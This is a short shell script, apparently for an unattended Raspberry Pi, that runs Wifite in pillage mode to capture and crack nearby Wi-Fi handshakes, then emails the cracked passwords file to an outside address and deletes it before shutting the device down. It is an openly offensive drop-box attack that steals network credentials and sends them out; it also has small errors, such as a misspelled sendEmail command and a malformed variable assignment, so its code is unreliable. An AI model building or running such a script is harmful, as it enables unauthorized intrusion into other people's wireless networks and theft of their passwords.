#!/usr/bin/sh

# Runs Wifite in Pillage mode for 60s and kills external proccesses
sleep 30s
wifite -p 60 --kill
wifite --cracked
# Return interface to managed mode
airmon-ng stop wlan0mon
systemctl start NetworkManager
# Send an email of cracked passwords and handshakes to username@email.com  
systemctl start postfix
sleep 30S
my_address = username@email.com
if [ -f "cracked.json" ]
then
    sendEmail -f pifi@attcking.pi -t $my_address -u "Pa$$W0RD$" -a cracked.json
    rm cracked.json
else
    endEmail -f pifi@attcking.pi -t $my_address -u "Unsuccessful Attack" -m "Plug the pi into power supply to retry."
fi
sleep 30s
systemctl stop postfix
# Shutdown the system
shutdown now